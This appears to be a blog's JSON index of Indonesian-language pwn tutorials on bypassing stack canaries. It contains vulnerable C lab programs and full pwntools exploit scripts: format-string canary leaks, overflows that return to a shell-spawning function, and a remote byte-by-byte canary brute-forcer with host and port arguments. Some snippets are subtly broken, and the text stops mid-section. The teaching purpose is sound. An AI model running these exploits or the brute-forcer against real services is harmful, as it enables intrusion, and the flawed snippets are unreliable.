[{"content":"1. Basic File Checks Lakukan pemeriksaan awal pada biner:\n# Compile dengan stack canary gcc -m32 -fstack-protector-all bof4.c -o bof4 # Periksa properti file file bof4 checksec bof4 Output:\nbof4: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=..., for GNU/Linux 3.2.0, not stripped [*] \u0026#39;/home/user/bof4\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) Kesimpulan: Biner 32-bit dengan proteksi Stack Canary dan NX Enabled, namun tanpa PIE (alamat fungsi statis).\n2. Review Source Code bof4.c:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; void win() { printf(\u0026#34;Congrats, you bypassed the canary!\\n\u0026#34;); system(\u0026#34;/bin/sh\u0026#34;); } void vuln() { char buf[64]; puts(\u0026#34;Level 4: Canary is enabled. Can you bypass it?\u0026#34;); printf(\u0026#34;Input: \u0026#34;); fgets(buf, 256, stdin); // VULNERABILITY: Buffer overflow! printf(\u0026#34;You said: %s\\n\u0026#34;, buf); // VULNERABILITY: Format string } int main() { setvbuf(stdout, NULL, _IONBF, 0); vuln(); puts(\u0026#34;Exiting...\u0026#34;); return 0; } Vulnerabilities:\nBuffer Overflow: fgets membaca 256 byte ke buffer 64 byte. Format String: printf(buf) memungkinkan leak data dari stack. Target: Eksploitasi untuk menjalankan fungsi win().\n3. Analisis Assembly dengan pwndbg Breakdown fungsi vuln:\ngdb ./bof4 disass vuln Output Penting:\n0x080491d4 \u0026lt;+18\u0026gt;: mov eax,gs:0x14 ; Load canary dari TLS 0x080491da \u0026lt;+24\u0026gt;: mov DWORD PTR [ebp-0xc],eax ; Simpan canary di [ebp-0xc] ... 0x08049218 \u0026lt;+86\u0026gt;: call 0x8049060 \u0026lt;fgets@plt\u0026gt; ; fgets(buf, 256, stdin) ... 0x08049233 \u0026lt;+113\u0026gt;: xor eax,DWORD PTR gs:0x14 ; Verifikasi canary 0x0804923a \u0026lt;+120\u0026gt;: je 0x8049241 \u0026lt;vuln+127\u0026gt; ; Jika valid, lanjutkan 0x0804923c \u0026lt;+122\u0026gt;: call 0x80490a0 \u0026lt;__stack_chk_fail_local\u0026gt; ; Jika corrupt, abort Layout Stack di vuln():\nAlamat Relatif Konten Ukuran ebp - 0x4c buf[64] 64 byte ebp - 0x0c Canary 4 byte ebp + 0x00 Saved EBP 4 byte ebp + 0x04 Return Address 4 byte Offset Penting:\nStart buffer ke canary: 64 byte Start buffer ke return address: 64 + 4 (canary) + 4 (saved ebp) = 72 byte 4. Strategi Exploit: Canary Leak \u0026amp; Bypass Langkah-langkah:\nLeak Canary: Manfaatkan format string printf(buf) untuk membaca nilai canary dari stack. Bypass Check: Gunakan nilai canary yang telah dileak pada payload overflow agar check dapat passed. Hijack EIP: Timpa return address dengan alamat fungsi win. 5. Langkah 1: Leak Canary via Format String Canary disimpan di stack. Kita gunakan format specifier %p atau $p untuk membacanya.\nFuzzing Posisi Canary:\n#!/usr/bin/env python3 from pwn import * context.binary = \u0026#39;./bof4\u0026#39; p = process(\u0026#39;./bof4\u0026#39;) # Kirim payload fuzz payload = b\u0026#39;\u0026#39; for i in range(1, 20): payload += f\u0026#39;%{i}$08p \u0026#39;.encode() # %[pos]$p p.sendline(payload) response = p.clean() print(response.decode()) p.close() Contoh Output:\nYou said: 0xffffd5cc 0x00000064 0xf7f9c580 0xffffffff ... 0x5c9e1a00 ... 0xf7de4c8d Cari nilai yang berakhiran 0x00 (null byte), seperti 0x5c9e1a00. Itu adalah canary. Misalnya ditemukan di posisi ke-13.\nScript Leak Canary:\np.recvuntil(b\u0026#34;Input: \u0026#34;) payload = b\u0026#39;%13$p\u0026#39; # Langsung ambil dari posisi yang diduga p.sendline(payload) # Parse output leaked_line = p.recvuntil(b\u0026#34;You said:\u0026#34;).split(b\u0026#39;\\n\u0026#39;)[-2] # Ambil baris sebelum \u0026#34;You said:\u0026#34; canary = int(leaked_line, 16) # Konversi string hex ke integer log.info(f\u0026#34;Leaked canary: {hex(canary)}\u0026#34;) 6. Langkah 2 \u0026amp; 3: Bangun Payload dan Hijack Control Flow Setelah canary diketahui, bangun payload overflow yang mempertahankan nilainya.\n# Offset offset_to_canary = 64 offset_to_ret = offset_to_canary + 4 + 4 # +4 (canary) +4 (saved ebp) # Alamat win (dapat dari gdb: p win, atau objdump -t bof4 | grep win) win_addr = 0x80491a6 # Bangun payload payload = b\u0026#39;A\u0026#39; * offset_to_canary # Isi buffer payload += p32(canary) # Timpa canary dengan nilai yang benar payload += b\u0026#39;B\u0026#39; * 4 # Timpa Saved EBP (bisa junk data) payload += p32(win_addr) # Timpa Return Address p.sendline(payload) p.interactive() # Enjoy your shell! 7. Full Exploit Script #!/usr/bin/env python3 from pwn import * context.binary = \u0026#39;./bof4\u0026#39; context.log_level = \u0026#39;info\u0026#39; p = process(\u0026#39;./bof4\u0026#39;) # [1] LEAK CANARY p.recvuntil(b\u0026#34;Input: \u0026#34;) p.sendline(b\u0026#39;%13$p\u0026#39;) # Ganti 13 dengan posisi canary yang sesuai leak = p.recvuntil(b\u0026#34;You said:\u0026#34;).split(b\u0026#39;\\n\u0026#39;)[-2] canary = int(leak, 16) log.success(f\u0026#34;Canary leaked: {hex(canary)}\u0026#34;) # [2] BUILD OVERFLOW PAYLOAD p.recvuntil(b\u0026#34;Input: \u0026#34;) offset = 64 win_addr = 0x80491a6 payload = flat({ offset: p32(canary), # Letakkan canary yang benar di offset 64 72: p32(win_addr) # Letakkan alamat win di offset 72 }) p.sendline(payload) # [3] GET SHELL p.interactive() Penjelasan flat():\nFungsi flat dari pwntools secara pintar mengatur payload.\n{64: p32(canary)} artinya di offset ke-64, tulis nilai canary. {72: p32(win_addr)} artinya di offset ke-72, tulis alamat win. Area antara 64-72 (yaitu saved EBP) otomatis diisi junk data. Eksekusi:\n$ python3 exploit.py [+] Canary leaked: 0x5c9e1a00 [*] Switching to interactive mode $ id uid=1000(user) gid=1000(user) groups=1000(user) $ ","permalink":"/posts/bypass-stack-canary/","title":"Bypassing Stack Canaries (Leak + Write) - Pwn03.1"},{"content":"","permalink":"/posts/","title":"Posts"},{"content":"","permalink":"/tags/pwn/","title":"Pwn"},{"content":"","permalink":"/tags/","title":"Tags"},{"content":"Apa itu Stack Canary? Stack canary adalah mekanisme keamanan yang ditempatkan di stack untuk mendeteksi buffer overflow. Namanya berasal dari analogi \u0026ldquo;canary in a coal mine\u0026rdquo; - jika canary mati, ada bahaya.\nCara Kerja: Setup: Saat fungsi dipanggil, nilai random (canary) ditempatkan di stack antara buffer dan return address Verification: Sebelum fungsi kembali, nilai canary diperiksa Detection: Jika nilai berubah, program terminate dengan segfault Layout Stack dengan Canary: High Addresses +-----------------+ | Return Address | +-----------------+ | Saved EBP | +-----------------+ | Stack Canary | ← Canary ditempatkan di sini +-----------------+ | Local Variables | | (termasuk buffer)| +-----------------+ Low Addresses 2. Tools dan Analisis Tools yang Digunakan: GDB dengan Pwndbg: Debugger dengan enhancement untuk exploit development Pwntools: Python library untuk CTF exploits Checksec: Untuk melihat proteksi binary Objdump: Untuk melihat assembly code Contoh Output Pwndbg: $ gdb ./vulnerable_program pwndbg\u0026gt; checksec [*] \u0026#39;/home/user/vulnerable_program\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) pwndbg\u0026gt; disassemble vulnerable_function Dump of assembler code for function vulnerable_function: 0x080484db \u0026lt;+0\u0026gt;: push ebp 0x080484dc \u0026lt;+1\u0026gt;: mov ebp,esp 0x080484de \u0026lt;+3\u0026gt;: sub esp,0x28 0x080484e1 \u0026lt;+6\u0026gt;: mov eax,gs:0x14 0x080484e7 \u0026lt;+12\u0026gt;: mov DWORD PTR [ebp-0xc],eax ; Canary disimpan di [ebp-0xc] 0x080484ea \u0026lt;+15\u0026gt;: xor eax,eax 0x080484ec \u0026lt;+17\u0026gt;: sub esp,0x4 0x080484ef \u0026lt;+20\u0026gt;: push 0x100 0x080484f4 \u0026lt;+25\u0026gt;: lea eax,[ebp-0x2c] 0x080484f7 \u0026lt;+28\u0026gt;: push eax 0x080484f8 \u0026lt;+29\u0026gt;: push 0x0 0x080484fa \u0026lt;+31\u0026gt;: call 0x80483a0 \u0026lt;read@plt\u0026gt; 0x080484ff \u0026lt;+36\u0026gt;: add esp,0x10 0x08048502 \u0026lt;+39\u0026gt;: mov eax,DWORD PTR [ebp-0xc] 0x08048505 \u0026lt;+42\u0026gt;: xor eax,gs:0x14 0x0804850c \u0026lt;+49\u0026gt;: je 0x8048513 \u0026lt;vulnerable_function+56\u0026gt; 0x0804850e \u0026lt;+51\u0026gt;: call 0x80483c0 \u0026lt;__stack_chk_fail@plt\u0026gt; 0x08048513 \u0026lt;+56\u0026gt;: leave 0x08048514 \u0026lt;+57\u0026gt;: ret End of assembler dump. Yang perlu dipahami dari output:\nmov eax,gs:0x14 - Mengambil canary dari Thread Local Storage mov DWORD PTR [ebp-0xc],eax - Menyimpan canary di stack xor eax,gs:0x14 - Memverifikasi canary sebelum return je 0x8048513 - Jump jika canary valid call __stack_chk_fail@plt - Terminate program jika canary corrupt 3. Metode Bypass Canary 32-bit A. Format String Exploit untuk Leak Canary Format string vulnerability terjadi ketika programmer menggunakan fungsi printf-style (printf, sprintf, fprintf, dll.) dengan parameter yang tidak terkontrol, memungkinkan attacker membaca dan menulis memory secara arbitrary.\nFungsi Vulnerable: // VULNERABLE - user mengontrol format string printf(user_input); // AMAN - format string dikontrol programmer printf(\u0026#34;%s\u0026#34;, user_input); Mengapa Format String Bisa Membaca Memory? Pada implementasi C, fungsi printf membaca parameter dari stack sesuai dengan specifier yang diberikan:\n%x - membaca 4 byte dari stack sebagai hexadecimal %p - membaca pointer dari stack %s - membaca string dari alamat yang ada di stack %n - menulis jumlah byte yang telah di-output ke alamat yang ada di stack 2. Teori Leak Canary via Format String Layout Stack saat printf Dipanggil: +-----------------+ | ... | +-----------------+ | Format String | ← Alamat format string (biasanya di stack juga) +-----------------+ | Arg1 | ← Parameter pertama untuk format specifier +-----------------+ | Arg2 | ← Parameter kedua +-----------------+ | ... | +-----------------+ | Canary Value | ← Nilai canary yang ingin kita leak +-----------------+ | ... | +-----------------+ Cara Kerja Leak: Ketika kita mengirim %n$p, printf akan membaca nilai ke-n dari stack Canary biasanya berada di posisi tertentu di stack Dengan mencoba offset berbeda, kita bisa menemukan posisi canary 3. Metodologi Lengkap Leak Canary Langkah 1: Identifikasi Vulnerability Cari code pattern seperti:\nprintf(input); // Langsung tanpa format string printf(buf); // Buffer mungkin mengandung user input Langkah 2: Fuzzing Offset Kirim payload seperti AAAA.%1$p.%2$p.%3$p... untuk memetakan stack:\nfrom pwn import * p = process(\u0026#39;./vulnerable\u0026#39;) # Fuzz offset for i in range(1, 20): p.sendline(f\u0026#39;%{i}$p\u0026#39;.encode()) response = p.recvline() print(f\u0026#34;Offset {i}: {response}\u0026#34;) p.clean() Langkah 3: Identifikasi Canary Canary biasanya memiliki karakteristik:\nNilai berubah setiap run (karena random) Byte terakhir biasanya \\x00 (null byte untuk mencegah string overflow) Format hexadecimal yang valid Contoh output fuzzing:\nOffset 1: 0x41414141 // AAAA kita Offset 2: 0xf7fa5000 // Libc address Offset 3: 0x8048520 // Code address Offset 4: (nil) // Null pointer Offset 5: 0xff8f7a44 // Stack address Offset 6: 0xefbe37a0 // Kemungkinan canary (random, berakhir 00) Offset 7: 0x1 // Offset 8: 0xff8f7b14 // Langkah 4: Konfirmasi Canary Verifikasi dengan mengirim payload yang specifically target suspected canary offset:\np.sendline(b\u0026#39;%6$p\u0026#39;) # Coba offset 6 response = p.recvline() canary_candidate = int(response.strip(), 16) # Cek karakteristik canary if canary_candidate \u0026amp; 0xff == 0x00: # Byte terakhir null print(f\u0026#34;Potential canary found: 0x{canary_candidate:08x}\u0026#34;) 4. Implementasi Exploit Lengkap Contoh Program Vulnerable: #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; void vuln() { char buf[64]; printf(\u0026#34;Enter your name: \u0026#34;); read(0, buf, 100); // Buffer overflow here printf(\u0026#34;Hello, \u0026#34;); printf(buf); // Format string vulnerability here printf(\u0026#34;\\n\u0026#34;); printf(\u0026#34;Enter your message: \u0026#34;); read(0, buf, 200); // Second buffer overflow } int main() { vuln(); return 0; } Eksploitasi Step-by-Step: from pwn import * # Context setting context(arch=\u0026#39;i386\u0026#39;, os=\u0026#39;linux\u0026#39;) context.log_level = \u0026#39;debug\u0026#39; # Untuk output verbose # Start process p = process(\u0026#39;./vulnerable_program\u0026#39;) # [STEP 1] Bypass prompt pertama p.recvuntil(\u0026#34;Enter your name: \u0026#34;) # [STEP 2] Kirim format string untuk leak canary # Setelah fuzzing, kita tahu canary ada di offset 7 p.sendline(\u0026#39;%7$p\u0026#39;) # [STEP 3] Parse leaked canary p.recvuntil(\u0026#34;Hello, \u0026#34;) leak = p.recvline().strip() canary = int(leak, 16) log.success(f\u0026#34;Leaked canary: 0x{canary:08x}\u0026#34;) # [STEP 4] Konfirmasi karakteristik canary if canary \u0026amp; 0xff != 0x00: log.warning(\u0026#34;This might not be a canary (no null byte)\u0026#34;) # Mungkin perlu coba offset lain # [STEP 5] Bypass prompt kedua p.recvuntil(\u0026#34;Enter your message: \u0026#34;) # [STEP 6] Bangun payload dengan canary yang valid # Hitung offset berdasarkan analisis binary offset = 64 # Size buffer padding = 8 # EBP yang disimpan payload = b\u0026#39;A\u0026#39; * offset # Isi buffer payload += p32(canary) Canary yang valid payload += b\u0026#39;B\u0026#39; * padding # Overwrite EBP payload += p32(0xdeadbeef) # Return address # [STEP 7] Kirim payload p.sendline(payload) # [STEP 8] Interact dengan shell p.interactive() 5. Analisis Assembly dan Debugging Disassembly Fungsi Vulnerable: 080484db \u0026lt;vuln\u0026gt;: 80484db: 55 push ebp 80484dc: 89 e5 mov ebp,esp 80484de: 83 ec 48 sub esp,0x48 80484e1: 65 a1 14 00 00 00 mov eax,gs:0x14 80484e7: 89 45 f4 mov DWORD PTR [ebp-0xc],eax ; Simpan canary 80484ea: 31 c0 xor eax,eax 80484ec: 83 ec 0c sub esp,0xc 80484ef: 68 90 85 04 08 push 0x8048590 ; \u0026#34;Enter your name: \u0026#34; 80484f4: e8 87 fe ff ff call 8048380 \u0026lt;printf@plt\u0026gt; 80484f9: 83 c4 10 add esp,0x10 80484fc: 83 ec 04 sub esp,0x4 80484ff: 6a 64 push 0x64 ; 100 bytes 8048501: 8d 45 b4 lea eax,[ebp-0x4c] ; Buffer di ebp-0x4c 8048504: 50 push eax 8048505: 6a 00 push 0x0 8048507: e8 a4 fe ff ff call 80483b0 \u0026lt;read@plt\u0026gt; 804850c: 83 c4 10 add esp,0x10 804850f: 83 ec 0c sub esp,0xc 8048512: 68 a2 85 04 08 push 0x80485a2 ; \u0026#34;Hello, \u0026#34; 8048517: e8 64 fe ff ff call 8048380 \u0026lt;printf@plt\u0026gt; 804851c: 83 c4 10 add esp,0x10 804851f: 83 ec 0c sub esp,0xc 8048522: 8d 45 b4 lea eax,[ebp-0x4c] ; Buffer vulnerable! 8048525: 50 push eax 8048526: e8 55 fe ff ff call 8048380 \u0026lt;printf@plt\u0026gt; ; Format string vuln 804852b: 83 c4 10 add esp,0x10 804852e: 83 ec 0c sub esp,0xc 8048531: 6a 0a push 0xa ; \u0026#34;\\n\u0026#34; 8048533: e8 68 fe ff ff call 80483a0 \u0026lt;putchar@plt\u0026gt; 8048538: 83 c4 10 add esp,0x10 804853b: 83 ec 0c sub esp,0xc 804853e: 68 a9 85 04 08 push 0x80485a9 ; \u0026#34;Enter your message: \u0026#34; 8048543: e8 38 fe ff ff call 8048380 \u0026lt;printf@plt\u0026gt; 8048548: 83 c4 10 add esp,0x10 804854b: 83 ec 04 sub esp,0x4 804854e: 68 c8 00 00 00 push 0xc8 ; 200 bytes 8048553: 8d 45 b4 lea eax,[ebp-0x4c] ; Buffer overflow 8048556: 50 push eax 8048557: 6a 00 push 0x0 8048559: e8 52 fe ff ff call 80483b0 \u0026lt;read@plt\u0026gt; 804855e: 83 c4 10 add esp,0x10 8048561: 8b 45 f4 mov eax,DWORD PTR [ebp-0xc] ; Load canary 8048564: 65 33 05 14 00 00 00 xor eax,gs:0x14 804856b: 74 05 je 8048572 \u0026lt;vuln+0x97\u0026gt; 804856d: e8 3e fe ff ff call 80483b0 \u0026lt;__stack_chk_fail@plt\u0026gt; 8048572: 8b 4d fc mov ecx,DWORD PTR [ebp-0x4] 8048575: c9 leave 8048576: 8d 61 fc lea esp,[ecx-0x4] 8048579: c3 ret Analisis Debugging dengan PWNDBG: # Start debugging gdb ./vulnerable_program pwndbg\u0026gt; break *0x8048526 # Break sebelum printf vulnerable pwndbg\u0026gt; r # Saat breakpoint hit, periksa stack pwndbg\u0026gt; telescope 20 00:0000│ esp 0xffffd500 —▸ 0xffffd52c ◂— \u0026#39;AAAA.%7$p\u0026#39; 01:0004│ 0xffffd504 ◂— 0x0 02:0008│ 0xffffd508 ◂— 0xf7fa5000 03:000c│ 0xffffd50c ◂— 0x8048520 04:0010│ 0xffffd510 ◂— 0x0 05:0014│ 0xffffd514 ◂— 0xff8f7a44 06:0018│ 0xffffd518 ◂— 0xefbe37a0 # Canary candidate 07:001c│ 0xffffd51c ◂— 0x1 08:0020│ 0xffffd520 ◂— 0xff8f7b14 # Verifikasi canary pwndbg\u0026gt; x/xw $ebp-0xc 0xffffd51c: 0xefbe37a0 # Match dengan offset 7 # Lanjut execution pwndbg\u0026gt; ni # Program akan mencetak \u0026#34;Hello, 0xefbe37a0\u0026#34; 6. Advanced Techniques dan Edge Cases Multiple Format String Exploits: Jika ada multiple format string vulnerabilities, kita bisa gunakan yang pertama untuk leak canary dan yang kedua untuk write exploit.\nPartial Overwrite dengan %n: Kita bisa gunakan %n untuk menulis nilai ke memory, tapi perlu hati-hati karena bisa merusak canary.\nBypass ASLR dengan Format String: Selain leak canary, format string bisa digunakan untuk leak alamat libc, heap, atau stack untuk bypass ASLR.\nAutomating dengan Pwntools: # Automated canary finding def find_canary_offset(): for i in range(1, 30): p = process(\u0026#39;./vulnerable\u0026#39;) p.recvuntil(\u0026#34;name: \u0026#34;) p.sendline(f\u0026#39;%{i}$p\u0026#39;.encode()) p.recvuntil(\u0026#34;Hello, \u0026#34;) leak = p.recvline().strip() try: value = int(leak, 16) if value \u0026amp; 0xff == 0x00: # Null byte characteristic log.info(f\u0026#34;Potential canary at offset {i}: 0x{value:08x}\u0026#34;) # Verify by checking if it changes between runs p.close() return i except: pass p.close() return None 7. Mitigation dan Countermeasures Cara Mencegah Format String Vulnerability: Selalu gunakan format string literal: printf(\u0026quot;%s\u0026quot;, user_input) Gunakan functions yang lebih aman seperti snprintf Implementasi stack canaries dengan nilai yang sangat random Gunakan compile-time protections seperti -D_FORTIFY_SOURCE=2 Deteksi dengan Static Analysis: Tools seperti Coverity, Checkmarx, atau Semgrep bisa detect pattern vulnerable seperti printf(user_input).\nB. Brute Force (Untuk Fork-based Server) Fork-based server adalah server yang menggunakan system call fork() untuk menangani setiap koneksi client secara terpisah. Setiap koneksi baru dibuat dalam proses child yang merupakan duplikat dari proses parent.\nCopy-on-Write (CoW) Mechanism: Pada sistem modern, fork() menggunakan teknik Copy-on-Write Memory pages dibagi antara parent dan child sampai salah satu proses mencoba menulis Canary yang di-generate oleh parent akan diwarisi oleh semua child processes Karena canary tidak diubah setelah fork, nilainya tetap sama across connections Mengapa Brute Force Mungkin? Deterministic: Canary sama untuk setiap koneksi baru Byte-by-byte: Kita bisa menebak canary satu byte per satu byte Feedback: Server akan crash jika canary salah, tetap hidup jika benar 256 possibilities per byte: Hanya 256 kemungkinan per byte (feasible) 2. Arsitektur Fork-based Server Vulnerable Contoh Server Code: #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;netinet/in.h\u0026gt; void handle_client(int sock) { char buffer[64]; // Baca input dari client read(sock, buffer, 128); // Buffer overflow vulnerability // Process client request write(sock, \u0026#34;Response\u0026#34;, 8); } int main() { int server_fd, client_sock; struct sockaddr_in address; int opt = 1; int addrlen = sizeof(address); // Create socket server_fd = socket(AF_INET, SOCK_STREAM, 0); setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, \u0026amp;opt, sizeof(opt)); address.sin_family = AF_INET; address.sin_addr.s_addr = INADDR_ANY; address.sin_port = htons(1234); bind(server_fd, (struct sockaddr*)\u0026amp;address, sizeof(address)); listen(server_fd, 3); while(1) { client_sock = accept(server_fd, (struct sockaddr*)\u0026amp;address, (socklen_t*)\u0026amp;addrlen); // Fork untuk handle client baru if (fork() == 0) { close(server_fd); handle_client(client_sock); exit(0); } close(client_sock); } return 0; } 3. Metodologi Brute Force Lengkap Phase 1: Reconnaissance from pwn import * import time # Tentukan offset ke canary def find_canary_offset(): # Gunakan pattern create/analyze atau manual calculation # Berdasarkan analisis binary return 64 # Contoh: canary berada setelah 64 bytes buffer offset = find_canary_offset() Phase 2: Byte-by-byte Bruteforce def brute_force_canary(host, port, offset): canary = b\u0026#39;\u0026#39; found_byte = False # Bruteforce 4 bytes (32-bit canary) for byte_num in range(4): found_byte = False for byte_val in range(256): # Buat koneksi baru conn = remote(host, port) # Bangun payload payload = b\u0026#39;A\u0026#39; * offset # Isi buffer payload += canary # Bytes canary yang sudah diketahui payload += bytes([byte_val]) # Byte yang sedang di-test # Kirim payload try: conn.send(payload) # Coba baca response try: response = conn.recv(timeout=2) # Jika dapat response, byte benar canary += bytes([byte_val]) log.success(f\u0026#34;Found byte {byte_num}: 0x{byte_val:02x}\u0026#34;) log.info(f\u0026#34;Current canary: 0x{canary.hex()}\u0026#34;) found_byte = True conn.close() break except EOFError: # Connection closed - byte salah conn.close() continue except Exception as e: log.warning(f\u0026#34;Error: {e}\u0026#34;) conn.close() continue if not found_byte: log.error(f\u0026#34;Failed to find byte {byte_num}\u0026#34;) return None return canary Phase 3: Verification def verify_canary(host, port, offset, canary): # Test canary yang ditemukan conn = remote(host, port) payload = b\u0026#39;A\u0026#39; * offset payload += canary payload += b\u0026#39;B\u0026#39; * 12 # Padding payload += b\u0026#39;C\u0026#39; * 4 # Return address dummy conn.send(payload) try: response = conn.recv(timeout=2) log.success(\u0026#34;Canary verified successfully!\u0026#34;) return True except: log.error(\u0026#34;Canary verification failed\u0026#34;) return False 4. Implementasi Robust dengan Error Handling from pwn import * import time class CanaryBruteforcer: def __init__(self, host, port, offset, timeout=2, max_retries=3): self.host = host self.port = port self.offset = offset self.timeout = timeout self.max_retries = max_retries self.canary = b\u0026#39;\u0026#39; def test_byte(self, candidate): \u0026#34;\u0026#34;\u0026#34;Test satu byte candidate\u0026#34;\u0026#34;\u0026#34; for attempt in range(self.max_retries): try: conn = remote(self.host, self.port) payload = b\u0026#39;A\u0026#39; * self.offset payload += self.canary payload += bytes([candidate]) conn.send(payload) # Tunggu response try: response = conn.recv(timeout=self.timeout) conn.close() return True except EOFError: conn.close() return False except Exception: conn.close() continue except Exception as e: log.warning(f\u0026#34;Connection error: {e}\u0026#34;) time.sleep(0.1) continue return False def brute_force(self): \u0026#34;\u0026#34;\u0026#34;Main bruteforce routine\u0026#34;\u0026#34;\u0026#34; start_time = time.time() for byte_num in range(4): found = False # Progress bar untuk current byte for byte_val in range(256): if self.test_byte(byte_val): self.canary += bytes([byte_val]) elapsed = time.time() - start_time log.success(f\u0026#34;Byte {byte_num}: 0x{byte_val:02x} \u0026#34; f\u0026#34;(Time: {elapsed:.2f}s, Canary: 0x{self.canary.hex()})\u0026#34;) found = True break if not found: log.error(f\u0026#34;Failed to find byte {byte_num}\u0026#34;) return None total_time = time.time() - start_time log.success(f\u0026#34;Full canary found: 0x{self.canary.hex()} in {total_time:.2f} seconds\u0026#34;) return self.canary # Usage bruteforcer = CanaryBruteforcer(\u0026#39;localhost\u0026#39;, 1234, offset=64) canary = bruteforcer.brute_force() 5. Analisis Kecepatan dan Optimasi Time Estimation: Worst-case: 4 bytes × 256 attempts × 2 seconds = ~34 menit Average-case: 4 bytes × 128 attempts × 2 seconds = ~17 menit Best-case: 4 bytes × 1 attempt × 2 seconds = ~8 detik Optimasi Techniques: 1. Parallel Connections:\nfrom concurrent.futures import ThreadPoolExecutor, as_completed def parallel_brute_force(self): \u0026#34;\u0026#34;\u0026#34;Bruteforce dengan parallel connections\u0026#34;\u0026#34;\u0026#34; with ThreadPoolExecutor(max_workers=10) as executor: for byte_num in range(4): futures = {} # Test semua byte values secara parallel for byte_val in range(256): future = executor.submit(self.test_byte, byte_val) futures[future] = byte_val # Process results for future in as_completed(futures): byte_val = futures[future] if future.result(): self.canary += bytes([byte_val]) break 2. Binary Search Approach (jika possible):\ndef binary_search_byte(self, byte_num): \u0026#34;\u0026#34;\u0026#34;Binary search untuk menemukan byte yang benar\u0026#34;\u0026#34;\u0026#34; low = 0 high = 255 while low \u0026lt;= high: mid = (low + high) // 2 if self.test_byte(mid): # Jika mid benar, cari yang lebih tinggi low = mid + 1 else: # Jika mid salah, cari yang lebih rendah high = mid - 1 return low - 1 # Return last successful byte 3. Adaptive Timeout:\ndef adaptive_test_byte(self, candidate): \u0026#34;\u0026#34;\u0026#34;Timeout adaptive berdasarkan response time\u0026#34;\u0026#34;\u0026#34; start_time = time.time() result = self.test_byte(candidate) response_time = time.time() - start_time # Jika response cepat, kemungkinan besar benar if response_time \u0026lt; 0.5: return True else: return result 6. Real-world Example dan Debugging Contoh Output Bruteforce: [+] Starting local process \u0026#39;./vulnerable_server\u0026#39;: pid 1234 [∗] Bruteforcing canary... [+] Byte 0: 0x00 (Time: 2.1s, Canary: 0x00) [+] Byte 1: 0xde (Time: 130.5s, Canary: 0x00de) [+] Byte 2: 0xad (Time: 258.3s, Canary: 0x00dead) [+] Byte 3: 0xbe (Time: 387.1s, Canary: 0x00deadbe) [+] Full canary found: 0x00deadbe in 387.1 seconds Debugging Tips: # Enable debug logging context.log_level = \u0026#39;debug\u0026#39; # Tambahkan timeout handling context.timeout = 2 # Gunakan signal handling untuk connection errors import signal signal.signal(signal.SIGALRM, timeout_handler) 7. Advanced Techniques Bypass Canary dengan Partial Overwrite: Jika kita sudah tahu beberapa byte canary (melalui info leak), kita bisa mengurangi waktu bruteforce.\ndef partial_bruteforce(self, known_bytes): \u0026#34;\u0026#34;\u0026#34;Bruteforce hanya bytes yang tidak diketahui\u0026#34;\u0026#34;\u0026#34; self.canary = known_bytes remaining_bytes = 4 - len(known_bytes) for byte_num in range(remaining_bytes): # ... same as before Heap Spraying Alternative: Untuk beberapa implementasi, canary mungkin diambil dari nilai tertentu yang bisa diprediksi.\nTiming Attacks: Menggunakan perbedaan waktu response untuk menentukan byte yang benar.\n8. Mitigation dan Countermeasures Cara Mencegah Bruteforce Attack: Canary Randomization: Generate canary baru setelah fork Connection Limits: Limit koneksi per IP address Rate Limiting: Tambahkan delay antara koneksi Canary Protection: Gunakan canary yang lebih kompleks Implementasi Secure: // Generate canary setelah fork void __attribute__((constructor)) generate_canary() { // Baca dari /dev/urandom untuk canary yang lebih secure int fd = open(\u0026#34;/dev/urandom\u0026#34;, O_RDONLY); read(fd, \u0026amp;global_canary, sizeof(global_canary)); close(fd); } 9. Tools dan Automation Automated Bruteforce Script: #!/usr/bin/env python3 import argparse from pwn import * def main(): parser = argparse.ArgumentParser(description=\u0026#39;Canary bruteforce tool\u0026#39;) parser.add_argument(\u0026#39;host\u0026#39;, help=\u0026#39;Target host\u0026#39;) parser.add_argument(\u0026#39;port\u0026#39;, type=int, help=\u0026#39;Target port\u0026#39;) parser.add_argument(\u0026#39;offset\u0026#39;, type=int, help=\u0026#39;Offset to canary\u0026#39;) parser.add_argument(\u0026#39;--timeout\u0026#39;, type=float, default=2, help=\u0026#39;Timeout per attempt\u0026#39;) parser.add_argument(\u0026#39;--workers\u0026#39;, type=int, default=1, help=\u0026#39;Number of parallel workers\u0026#39;) args = parser.parse_args() bruteforcer = CanaryBruteforcer( args.host, args.port, args.offset, timeout=args.timeout ) canary = bruteforcer.brute_force() if canary: print(f\u0026#34;Success! Canary: 0x{canary.hex()}\u0026#34;) else: print(\u0026#34;Bruteforce failed\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: main() C. Partial Overwrite (Jika Ada Info Leak) Mengapa Partial Overwrite Mungkin? Ketika program memiliki vulnerability information leak (seperti format string bug), penyerang dapat:\nMembaca nilai canary dari memory Merekonstruksi canary yang valid Membuat payload yang mempertahankan canary asli Meng-overwrite hanya bagian setelah canary Alur Eksploitasi Leak Information: Dapatkan alamat buffer atau nilai canary Reconstruct Canary: Gunakan informasi yang dibocorkan Craft Payload: Buat payload yang mempertahankan canary valid Hijack Control Flow: Overwrite return address atau fungsi pointer Tantangan dalam Partial Overwrite Canary yang randomized membutuhkan leak untuk setiap eksekusi Format string exploitation membutuhkan pemahaman layout stack Ukuran buffer yang terbatas mempersulit payload complex Analisis Program Vulnerable Kode Sumber Vulnerable #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; void vulnerable() { char buffer[40]; printf(\u0026#34;Buffer is at %p\\n\u0026#34;, buffer); read(0, buffer, 100); printf(\u0026#34;Hello, %s\\n\u0026#34;, buffer); } int main() { vulnerable(); return 0; } Kompilasi dengan Proteksi gcc -m32 -fstack-protector vuln.c -o vuln Analisis Assembly Mendalam Dengan menggunakan objdump -d -M intel vuln, kita dapat menganalisis fungsi vulnerable:\n080484db 